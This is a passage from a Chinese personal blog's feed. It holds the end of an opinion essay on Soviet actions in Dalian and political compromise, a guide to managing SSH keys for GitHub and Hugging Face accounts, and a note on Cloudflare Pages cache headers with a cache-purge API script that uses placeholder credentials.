        <content type="html"><![CDATA[<h2 id="政治妥协"><a href="#政治妥协" class="headerlink" title="政治妥协"></a><code>政治妥协</code></h2><p>官方对于<code>苏军抢夺大连暴行</code>存在美化甚至掩盖，说是卖国也好！没骨气也罢！当年实力太弱，抗议前苏联有用吗？不仅急需苏联支持以赢得内战，而且打下来城市还向人家学习城市治理，甚至收复失地还要靠美国军舰帮忙……<br>民国作为<code>一战</code>的战胜国，还是被被列强<code>出卖</code>。罗斯福为了寻求苏联支持，他竟然直接替<code>委员长</code>做决定——支持<code>蒙古</code>独立。<code>吃败仗</code>赔钱，好不容易<code>打赢了</code>，还是<code>赔本</code>。还是那些话，<code>弱国无外交！</code>，<code>战场上拿不到的，也休想在谈判桌上拿到！</code>。<br><code>政治妥协</code>也是<code>利益交换</code>，是不得已而为之啊。但凡当时有<mark class="hl-label red">敢同恶鬼争高下，不向霸王让寸分</mark> 的叫板能力，谁想<code>遭后人唾骂</code>？</p><h2 id="夹缝求生的策略"><a href="#夹缝求生的策略" class="headerlink" title="夹缝求生的策略"></a><code>夹缝求生</code>的策略</h2><p>抗战时期还存在“敌后趁机做大”……中共有黑历史，国民党也有。什么叫政治？若把家底儿拼光了，撑不到最后，什么都是假的！<mark class="hl-label red">兴，百姓苦！亡，百姓苦！</mark> 平民，在历朝历代都是政治的牺牲品。</p><h2 id="有理无理地抨击"><a href="#有理无理地抨击" class="headerlink" title="有理无理地抨击"></a>有理无理地<code>抨击</code></h2><p>以“鹅爹，还有黑历史”不断抨击的人，让人不齿！甚至以此为由“扛起反对大旗，为了反对而反对”，更让人不屑！“西式民主化”就能拨乱反正救中国？我不以为然！</p><h2 id="认清功过"><a href="#认清功过" class="headerlink" title="认清功过"></a>认清<code>功过</code></h2><p>事实上，即便前期过于理想化、盲目乐观地搞建设，做出了一系列的错误的经济政策，甚至内部的政治斗争连续数年，都给国家和人民造成了巨大损失。<br>不过国家在两大阵营的不断封锁下，能保持独立性，这是很难得的。小平同志<code>为生民立命</code>，没有被意识形态所绑架，果断出击，成功保障了14亿人口吃饱饭，史上罕见。这不是俄吹美吹！民主<code>印度</code>当年的经济基础比中国好太多，现在能“睁眼看世界”的印度人太少了，他们深信<code>上海</code>不如<code>孟买</code>。</p><h2 id="对成王败寇的反思"><a href="#对成王败寇的反思" class="headerlink" title="对成王败寇的反思"></a>对<code>成王败寇</code>的反思</h2><p>官方可以出于政治目的隐藏甚至歪曲<code>苏军抢夺大连</code>这段历史，但国民要尽可能多渠道求真这段史实。<mark class="hl-label red">我国历史上，受俄国侵害，久矣！重矣！</mark> 现在是朋友，不代表永远是朋友，只是偶尔利益一致罢了！</p>]]></content>
      
      
      <categories>
          
          <category> 随笔 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 政治 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>git与SSH公私key</title>
      <link href="/posts/git-yu-ssh-gong-si-key/"/>
      <url>/posts/git-yu-ssh-gong-si-key/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="需求"><a href="#需求" class="headerlink" title="需求:"></a>需求:</h2><blockquote><p>我有不同平台github，hf.co账户，其中hf.co有两个账户a,b。。。我想尽可能清晰较少文件地管理所有私钥公钥。应该先后如何生成公私密钥对。。给出最终的.ssh目录结构，以及内部文件对应的内容示例？</p><p>我之前的做法是，<br>各个平台的首个账户，即GitHub与HF.co账户a用的都是同一个密钥对。公私密钥生成时选用默认命名（该命名在不影响鉴权的前提下能否重命名，如何做）<br>若相同平台上存在第一个账户，链接第二个账户时，才新建新的密钥对并做第二个账户名标记。</p></blockquote><h1 id="SSH密钥管理方案"><a href="#SSH密钥管理方案" class="headerlink" title="SSH密钥管理方案"></a>SSH密钥管理方案</h1><h2 id="密钥生成策略"><a href="#密钥生成策略" class="headerlink" title="密钥生成策略"></a>密钥生成策略</h2><h3 id="1-首先生成默认密钥对（用于主要平台的首个账户）"><a href="#1-首先生成默认密钥对（用于主要平台的首个账户）" class="headerlink" title="1. 首先生成默认密钥对（用于主要平台的首个账户）"></a>1. 首先生成默认密钥对（用于主要平台的首个账户）</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t ed25519 -C <span class="string">&quot;your-email@example.com&quot;</span></span><br><span class="line"><span class="comment"># 使用默认路径和命名：~/.ssh/id_ed25519 和 ~/.ssh/id_ed25519.pub</span></span><br></pre></td></tr></table></figure><h3 id="2-为HF-co的第二个账户b生成专用密钥对"><a href="#2-为HF-co的第二个账户b生成专用密钥对" class="headerlink" title="2. 为HF.co的第二个账户b生成专用密钥对"></a>2. 为HF.co的第二个账户b生成专用密钥对</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t ed25519 -f ~/.ssh/hf/id_ed25519_hf_b -C <span class="string">&quot;hf-b@example.com&quot;</span></span><br></pre></td></tr></table></figure><h2 id="最终-ssh目录结构"><a href="#最终-ssh目录结构" class="headerlink" title="最终.ssh目录结构"></a>最终.ssh目录结构</h2><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">~/.ssh/</span><br><span class="line">├── config              # SSH配置文件</span><br><span class="line">├── id_ed25519         # 默认私钥（用于GitHub和HF.co账户a）</span><br><span class="line">├── id_ed25519.pub     # 默认公钥</span><br><span class="line">└── hf</span><br><span class="line">├── id_ed25519_hf_b    # HF.co账户b的私钥</span><br><span class="line">└── id_ed25519_hf_b.pub # HF.co账户b的公钥</span><br></pre></td></tr></table></figure><h2 id="配置文件内容-ssh-config"><a href="#配置文件内容-ssh-config" class="headerlink" title="配置文件内容 (~&#x2F;.ssh&#x2F;config)"></a>配置文件内容 (~&#x2F;.ssh&#x2F;config)</h2><p>ssh-config</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># GitHub - 使用默认密钥</span></span><br><span class="line">Host github.com</span><br><span class="line">  HostName github.com</span><br><span class="line">  User git</span><br><span class="line">  IdentityFile ~/.ssh/id_ed25519</span><br><span class="line">  IdentitiesOnly <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># HF.co 账户a - 使用默认密钥</span></span><br><span class="line">Host hf.co</span><br><span class="line">  HostName hf.co</span><br><span class="line">  User git</span><br><span class="line">  IdentityFile ~/.ssh/id_ed25519</span><br><span class="line">  IdentitiesOnly <span class="built_in">yes</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># HF.co 账户b - 使用专用密钥</span></span><br><span class="line">Host hf-b.co</span><br><span class="line">  HostName hf.co</span><br><span class="line">  User git</span><br><span class="line">  IdentityFile ~/.ssh/hf/id_ed25519_hf_b</span><br><span class="line">  IdentitiesOnly <span class="built_in">yes</span></span><br></pre></td></tr></table></figure><h2 id="密钥重命名方法"><a href="#密钥重命名方法" class="headerlink" title="密钥重命名方法"></a>密钥重命名方法</h2><p>如果您想重命名现有的密钥文件（不影响鉴权）：</p><ol><li><p>重命名文件：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">mv</span> ~/.ssh/id_ed25519 ~/.ssh/id_ed25519_main</span><br><span class="line"><span class="built_in">mv</span> ~/.ssh/id_ed25519.pub ~/.ssh/id_ed25519_main.pub</span><br></pre></td></tr></table></figure></li><li><p>更新SSH配置：</p><p>ssh-config</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">  HostName github.com</span><br><span class="line">  User git</span><br><span class="line">  IdentityFile ~/.ssh/id_ed25519_main</span><br><span class="line"></span><br><span class="line">Host hf.co</span><br><span class="line">  HostName hf.co</span><br><span class="line">  User git</span><br><span class="line">  IdentityFile ~/.ssh/id_ed25519_main</span><br><span class="line">  </span><br><span class="line">Host hf_b.co</span><br><span class="line">  HostName hf.co</span><br><span class="line">  User git</span><br><span class="line">  IdentityFile ~/.ssh/id_ed25519_hf_b</span><br></pre></td></tr></table></figure></li><li><p>更新SSH代理（如果使用）：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ssh-add -D  <span class="comment"># 清除所有密钥</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 重启 SSH 代理</span></span><br><span class="line"><span class="built_in">eval</span> <span class="string">&quot;<span class="subst">$(ssh-agent -s)</span>&quot;</span></span><br><span class="line"></span><br><span class="line">ssh-add ~/.ssh/id_ed25519_main  <span class="comment"># 添加重命名后的密钥</span></span><br></pre></td></tr></table></figure></li></ol><h2 id="使用说明"><a href="#使用说明" class="headerlink" title="使用说明"></a>使用说明</h2><ol><li><strong>GitHub仓库</strong>：使用标准URL <code>git@github.com:username/repo.git</code></li><li><strong>HF.co账户a</strong>：使用标准URL <code>git@hf.co:spaces/username/repo</code></li><li><strong>HF.co账户b</strong>：使用特殊URL <code>git@hf-b.co:spaces/username/repo</code></li></ol><h2 id="公钥分发"><a href="#公钥分发" class="headerlink" title="公钥分发"></a>公钥分发</h2><p>将公钥内容添加到相应平台：</p><ul><li>GitHub: 将 <code>~/.ssh/id_ed25519.pub</code> 内容添加到GitHub账户</li><li>HF.co账户a: 将 <code>~/.ssh/id_ed25519.pub</code> 内容添加到账户a</li><li>HF.co账户b: 将 <code>~/.ssh/id_ed25519_hf_b.pub</code> 内容添加到账户b</li></ul><h2 id="测试连接"><a href="#测试连接" class="headerlink" title="测试连接"></a>测试连接</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 测试GitHub连接</span></span><br><span class="line">ssh -T git@github.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试HF.co账户a连接</span></span><br><span class="line">ssh -T git@hf.co</span><br><span class="line"></span><br><span class="line"><span class="comment"># 测试HF.co账户b连接[注意ssh-config中的Host别名为`hf_b.co`]</span></span><br><span class="line">ssh -T git@hf_b.co</span><br></pre></td></tr></table></figure><p>这种配置方式既清晰又简洁，使用最少的文件管理所有平台的SSH密钥，同时通过SSH配置文件实现了智能路由。</p><h2 id="拓展："><a href="#拓展：" class="headerlink" title="拓展："></a>拓展：</h2><h2 id="公私密钥的2种编码"><a href="#公私密钥的2种编码" class="headerlink" title="公私密钥的2种编码"></a><code>公私密钥</code>的2种编码</h2><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -b 4096 -f ~/.ssh/github -C <span class="string">&quot;github@example.com&quot;</span></span><br><span class="line">ssh-keygen -t ed25519 -f ~/.ssh/github -C <span class="string">&quot;github@example.com&quot;</span></span><br></pre></td></tr></table></figure><h3 id="1-RSA-4096-位密钥"><a href="#1-RSA-4096-位密钥" class="headerlink" title="1. RSA 4096 位密钥"></a>1. <strong>RSA 4096 位密钥</strong></h3><ul><li><strong>算法</strong>: RSA (Rivest-Shamir-Adleman)</li><li><strong>密钥长度</strong>: 4096 位</li></ul><h3 id="2-Ed25519-密钥"><a href="#2-Ed25519-密钥" class="headerlink" title="2. Ed25519 密钥"></a>2. <strong>Ed25519 密钥</strong></h3><ul><li><strong>算法</strong>: Ed25519 (基于椭圆曲线密码学)</li><li><strong>密钥长度</strong>: 256 位（相当于约 3000 位的 RSA 安全性）</li></ul><h2 id="C-参数的作用和影响"><a href="#C-参数的作用和影响" class="headerlink" title="-C 参数的作用和影响"></a>-C 参数的作用和影响</h2><h3 id="C-参数的含义"><a href="#C-参数的含义" class="headerlink" title="-C 参数的含义"></a>-C 参数的含义</h3><ul><li><code>-C</code> 参数用于添加注释，通常包含邮箱或标识信息</li><li>这个注释会出现在公钥的末尾，仅用于标识目的</li><li><strong>不影响密钥的加密功能或认证过程</strong></li></ul><h3 id="使用相同-C-值的影响"><a href="#使用相同-C-值的影响" class="headerlink" title="使用相同 -C 值的影响"></a>使用相同 -C 值的影响</h3><ul><li><strong>技术上</strong>: 完全没问题，不会影响 SSH 认证</li><li><strong>管理上</strong>: 不推荐，因为会使密钥难以区分</li><li><strong>最佳实践</strong>: 使用有意义的注释，如：<ul><li><code>&quot;hf-account1@example.com&quot;</code></li><li><code>&quot;hf-account2@example.com&quot;</code></li><li><code>&quot;github-work@example.com&quot;</code></li></ul></li></ul><hr><h1 id="SSH-配置与密钥管理详解"><a href="#SSH-配置与密钥管理详解" class="headerlink" title="SSH 配置与密钥管理详解"></a>SSH 配置与密钥管理详解</h1><h2 id="1-SSH-配置片段分析"><a href="#1-SSH-配置片段分析" class="headerlink" title="1. SSH 配置片段分析"></a>1. SSH 配置片段分析</h2><p>ssh-config</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Host github.com</span><br><span class="line">    CheckHostIP no</span><br><span class="line">    HostName ssh.github.com</span><br><span class="line">    User git</span><br><span class="line">    Port 443</span><br></pre></td></tr></table></figure><h3 id="这个配置的含义："><a href="#这个配置的含义：" class="headerlink" title="这个配置的含义："></a>这个配置的含义：</h3><ul><li><strong>目的</strong>：通过 HTTPS 端口（443）建立 SSH 连接，绕过某些网络限制</li><li><strong>具体设置</strong>：<ul><li><code>HostName ssh.github.com</code>：实际连接的主机名</li><li><code>Port 443</code>：使用 HTTPS 端口而非默认的 SSH 端口 22</li><li><code>User git</code>：使用 git 用户连接</li><li><code>CheckHostIP no</code>：不检查主机 IP 是否与 known_hosts 中的记录匹配</li></ul></li></ul><h3 id="是否正确？"><a href="#是否正确？" class="headerlink" title="是否正确？"></a>是否正确？</h3><p><strong>完全正确</strong>。这是 GitHub 官方推荐的备用连接方式，特别适用于：</p><ul><li>公司或学校网络限制 SSH 端口（22）的情况</li><li>防火墙阻止了标准 SSH 连接的环境</li></ul><h2 id="2-ssh-add-命令详解"><a href="#2-ssh-add-命令详解" class="headerlink" title="2. ssh-add 命令详解"></a>2. ssh-add 命令详解</h2><h3 id="命令作用："><a href="#命令作用：" class="headerlink" title="命令作用："></a>命令作用：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ssh-add -D  <span class="comment"># 从 SSH 代理中移除所有已缓存的密钥</span></span><br><span class="line">ssh-add ~/.ssh/id_ed25519_main  <span class="comment"># 将指定密钥添加到 SSH 代理</span></span><br></pre></td></tr></table></figure><h3 id="使用场景："><a href="#使用场景：" class="headerlink" title="使用场景："></a>使用场景：</h3><ol><li><strong>密钥重命名后</strong>：更新 SSH 代理中的密钥路径</li><li><strong>切换身份时</strong>：清除旧密钥，添加新密钥</li><li><strong>安全考虑</strong>：会话结束后移除缓存的密钥</li><li><strong>调试问题</strong>：重新加载密钥以解决连接问题</li></ol><h3 id="工作流程示例："><a href="#工作流程示例：" class="headerlink" title="工作流程示例："></a>工作流程示例：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1. 查看当前代理中的密钥</span></span><br><span class="line">ssh-add -l</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 清除所有密钥</span></span><br><span class="line">ssh-add -D</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 添加新密钥（需要密码时输入）</span></span><br><span class="line">ssh-add ~/.ssh/id_ed25519_main</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 验证密钥已添加</span></span><br><span class="line">ssh-add -l</span><br></pre></td></tr></table></figure><h2 id="3-known-hosts-文件详解"><a href="#3-known-hosts-文件详解" class="headerlink" title="3. known_hosts 文件详解"></a>3. known_hosts 文件详解</h2><h3 id="是什么？"><a href="#是什么？" class="headerlink" title="是什么？"></a>是什么？</h3><p><code>~/.ssh/known_hosts</code> 是一个存储已知 SSH 主机密钥的文件。</p><h3 id="作用："><a href="#作用：" class="headerlink" title="作用："></a>作用：</h3><ol><li><strong>安全验证</strong>：防止中间人攻击（Man-in-the-Middle）</li><li><strong>主机身份验证</strong>：确保连接的是真正的主机而非恶意服务器</li><li><strong>自动信任</strong>：首次连接后记录主机密钥，后续连接自动验证</li></ol><h3 id="文件内容示例："><a href="#文件内容示例：" class="headerlink" title="文件内容示例："></a>文件内容示例：</h3><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">github.com ssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAq2A7hRGmd...</span><br><span class="line">hf.co ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAI...</span><br></pre></td></tr></table></figure><h3 id="常见操作："><a href="#常见操作：" class="headerlink" title="常见操作："></a>常见操作：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看 known_hosts 内容</span></span><br><span class="line"><span class="built_in">cat</span> ~/.ssh/known_hosts</span><br><span class="line"></span><br><span class="line"><span class="comment"># 删除特定主机的记录（当主机密钥变更时）</span></span><br><span class="line">ssh-keygen -R github.com</span><br><span class="line"></span><br><span class="line"><span class="comment"># 手动添加主机密钥（不推荐，有安全风险）</span></span><br><span class="line">ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts</span><br></pre></td></tr></table></figure><h3 id="重要提示："><a href="#重要提示：" class="headerlink" title="重要提示："></a>重要提示：</h3><ul><li><p><strong>首次连接</strong>时会出现确认主机密钥的提示：</p><figure class="highlight txt"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">The authenticity of host &#x27;github.com (IP_ADDRESS)&#x27; can&#x27;t be established.</span><br><span class="line">RSA key fingerprint is SHA256:nThbg6kXUpJWGl7E1IGOCspRomTxdCARLviKw6E5SY8.</span><br><span class="line">Are you sure you want to continue connecting (yes/no/[fingerprint])?</span><br></pre></td></tr></table></figure></li><li><p>输入 <code>yes</code> 后，该主机的密钥会被添加到 <code>known_hosts</code> 中</p></li><li><p>如果主机密钥意外变更，连接会被拒绝（安全保护机制）</p></li></ul><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><ol><li><strong>GitHub 的 443 端口配置</strong>是有效的备用连接方案</li><li><strong>ssh-add</strong> 用于管理 SSH 代理中的密钥缓存</li><li><strong>known_hosts</strong> 是重要的安全机制，确保连接的主机身份真实</li></ol><p>这样的配置和管理方式既保证了连接的灵活性，又确保了安全性。</p>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CFPages-CacheRules</title>
      <link href="/posts/cfpages-cacherules/"/>
      <url>/posts/cfpages-cacherules/</url>
      
        <content type="html"><![CDATA[<p>[TOC]</p><h2 id="一、直接访问-pages-dev默认域名"><a href="#一、直接访问-pages-dev默认域名" class="headerlink" title="一、直接访问*.pages.dev默认域名"></a>一、直接访问<code>*.pages.dev</code>默认域名</h2><ol><li>在<code>source/</code>目录下新建<code>_headers</code>配置文件（无拓展名），内容（注意缩进）如下，</li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"># 为所有静态资源设置缓存策略</span><br><span class="line"># 一年31536000，一周604800，一天86400</span><br><span class="line"></span><br><span class="line">/search.xml</span><br><span class="line">  Content-Type: application/xml</span><br><span class="line">  Cache-Control: public, max-age=600, s-maxage=3600</span><br><span class="line">  </span><br><span class="line">/</span><br><span class="line">  Cache-Control: public, max-age=600, s-maxage=3600</span><br><span class="line">  </span><br><span class="line">/posts/*</span><br><span class="line">  Cache-Control: public, max-age=600, s-maxage=3600</span><br><span class="line"></span><br><span class="line">/*.css</span><br><span class="line">  Content-Type: text/css; charset=utf-8</span><br><span class="line">  Cache-Control: public, max-age=86400, s-maxage=31536000</span><br><span class="line"></span><br><span class="line">/*.js</span><br><span class="line">  Content-Type: application/javascript</span><br><span class="line">  Cache-Control: public, max-age=604800, s-maxage=31536000</span><br><span class="line"></span><br><span class="line">/json/*</span><br><span class="line">  Content-Type: application/json</span><br><span class="line">  Cache-Control: public, max-age=604800, s-maxage=31536000</span><br><span class="line"></span><br><span class="line">/icons/*</span><br><span class="line">  Content-Type: image/webp</span><br><span class="line">  Cache-Control: public, max-age=604800, s-maxage=31536000</span><br></pre></td></tr></table></figure><p>（Cache-Control 的 max-age 是客户端缓存时间；s-maxage 是CDN 边缘节点（Cloudflare Edge）缓存时间；单位为“秒”。）</p><ol start="2"><li>部署pages项目时,会自动应用 <code>_headers</code>配置文件中定义的缓存规则！<br><img src="/posts/cfpages-cacherules/CFPages%E9%A1%B9%E7%9B%AE%E6%A0%B9%E7%9B%AE%E5%BD%95%E7%9A%84headers%E9%85%8D%E7%BD%AE%E7%94%9F%E6%95%881.webp" alt="CFPages项目根目录的headers配置生效"></li></ol><h2 id="二、缓存规则优先级"><a href="#二、缓存规则优先级" class="headerlink" title="二、缓存规则优先级"></a>二、<code>缓存规则</code>优先级</h2><p>若CFPages项目内 <code>_headers</code>文件中设置了 Cache-Control，并绑定了自定义域名，比如<code>aa.com</code>。即便该域名对应的CF面板中另行配置了“缓存规则”，也无效！<br><code>_headers</code> 是 Cloudflare Pages 构建阶段通过<code>Worker Runtime</code>注入的，非传统源站头，优先级<code>极高</code>！<br><strong><mark class="hl-label Cloudflare">控制面板规则可覆盖`非</mark> </strong></p><p><code>优先级</code> 如下：</p><table><thead><tr><th>优先级</th><th>来源类型</th></tr></thead><tbody><tr><td>🥇 1. Cloudflare Workers 或 Pages Runtime（如 <code>_headers</code> 设置的 <code>Cache-Control</code>）</td><td>CF Pages</td></tr><tr><td>🥈 2. 自定义 Worker 你手写的 <code>response.headers.set()</code></td><td></td></tr><tr><td>🥉 3. 源站 HTTP 响应头（非 Pages）</td><td>非CF Pages</td></tr><tr><td>⚪ 4. Cloudflare 缓存规则（Cache Rules）中设置“忽略缓存控制标头”+ TTL</td><td></td></tr><tr><td>⚪ 5. 页面规则中“缓存所有内容 + 边缘 TTL”设置（已被 Cache Rules 替代）</td><td></td></tr></tbody></table><h2 id="三、如何清除边缘缓存"><a href="#三、如何清除边缘缓存" class="headerlink" title="三、如何清除边缘缓存"></a>三、如何清除<code>边缘缓存</code></h2><h3 id="pages-dev默认域名"><a href="#pages-dev默认域名" class="headerlink" title="*.pages.dev默认域名"></a>*.pages.dev默认域名</h3><p><code>*.pages.dev</code>默认域名是 Cloudflare 拥有的共享域名，不在用户的 DNS 控制之下，用户没有清除缓存的权限，无法通过 Cloudflare 控制台或 API 强制清除边缘缓存，只有如下两种方法：</p><div class="tip success"><ol><li>等待<code>s-maxage</code>自动过期;</li><li>重新部署项目（版本变更，会强制刷新<code>边缘缓存</code>）</li></ol></div><h3 id="CF管理的域名"><a href="#CF管理的域名" class="headerlink" title="CF管理的域名"></a>CF管理的域名</h3><p>由于该自定义域名在用户的 DNS 控制之下，除了以上两种方式，还可以直接通过<code> Cloudflare 控制台</code>或 <code>API </code>强制清除<code>边缘缓存</code>。</p><ol><li>登录<code> Cloudflare 控制台</code>，点击对应区域的<code>清除边缘缓存</code>按钮，如下图。<br><img src="/posts/cfpages-cacherules/CF%E6%8E%A7%E5%88%B6%E5%8F%B0%E6%B8%85%E9%99%A4%E8%BE%B9%E7%BC%98%E7%BC%93%E5%AD%982.webp" alt="CF控制台清除边缘缓存"></li><li>调用CF的 <code>清理边缘缓存API</code>。</li></ol><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> axios = <span class="built_in">require</span>(<span class="string">&#x27;axios&#x27;</span>);</span><br><span class="line"><span class="comment">// 配置</span></span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CLOUDFLARE_API_TOKEN</span> = <span class="string">&#x27;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CLOUDFLARE_ZONE_ID</span> = <span class="string">&#x27;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#x27;</span>;</span><br><span class="line"><span class="keyword">const</span> <span class="variable constant_">CLOUDFLARE_CACHE_API</span> = <span class="string">`https://api.cloudflare.com/client/v4/zones/<span class="subst">$&#123;CLOUDFLARE_ZONE_ID&#125;</span>/purge_cache`</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 清理缓存</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">clearCache</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    <span class="keyword">const</span> response = <span class="keyword">await</span> axios.<span class="title function_">post</span>(</span><br><span class="line">      <span class="variable constant_">CLOUDFLARE_CACHE_API</span>,</span><br><span class="line">      &#123; <span class="attr">purge_everything</span>: <span class="literal">true</span> &#125;,</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="attr">headers</span>: &#123;</span><br><span class="line">          <span class="title class_">Authorization</span>: <span class="string">`Bearer <span class="subst">$&#123;CLOUDFLARE_API_TOKEN&#125;</span>`</span>,</span><br><span class="line">          <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/json&#x27;</span>,</span><br><span class="line">        &#125;,</span><br><span class="line">      &#125;</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (response.<span class="property">data</span>.<span class="property">success</span>) &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;Cloudflare 缓存(eamon.dpdns.org区域)已清理成功！&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">      <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;缓存清理失败：&#x27;</span>, response.<span class="property">data</span>.<span class="property">errors</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; <span class="keyword">catch</span> (error) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">error</span>(<span class="string">&#x27;清理缓存失败：&#x27;</span>, error.<span class="property">message</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Serv00-SetupAlive-CFTunnel</title>
      <link href="/posts/serv00-setupalive-cftunnel/"/>
      <url>/posts/serv00-setupalive-cftunnel/</url>
      
